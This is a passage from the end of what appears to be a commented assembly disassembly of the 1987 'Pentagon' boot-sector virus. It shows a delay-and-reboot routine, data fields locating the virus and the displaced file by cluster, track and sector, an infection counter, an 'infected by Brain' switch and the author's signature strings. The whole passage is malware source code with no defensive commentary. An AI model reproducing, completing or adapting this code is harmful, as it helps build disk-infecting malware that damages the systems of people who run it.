	JNZ	BP074F			; Repeat delay for count
	CALL	BP04A0			; Generate a sound
	XOR	CX,CX			; Maximum loop
BP075A:	LOOP	BP075A			; Delay
	MOV	BYTE PTR CS:DB07E0,5	; Set count to 5
	STI
	INT	19H			; Disk bootstrap

BP0765:	POPF
	RETF	2

	DB	27 DUP (0)

DW0784	DW	0064H			; Cluster number of virus
DW0786	DW	0066H			; Cluster number of file
DW0788	DW	0B02H			; Virus track & sector
DW078A	DW	0101H			; Virus head and drive
DW078C	DW	0B06H			; File track and sector
DW078E	DW	0101H			; File head and drive
DB0790	DB	1			; Device number

DB0791	DB	'PENTAGONTXT', 21H, 17 DUP (0), 4, 0, 0
DB07B1	DB	'Pentagon,ZG'
DB07BC	DB	'(c) 1987 The Pentagon, Zorell Group$'

DB07E0	DB	20H			; Infection count
DB07E1	DB	0FFH			; Infected by Brain switch
DB07E2	DB	0			; Directory update switch
DB07E3	DB	0			; Reboot switch

	DB	' first sector in segment', 0DH, 0AH, 9, 6DH

CODE	ENDS

	END	START
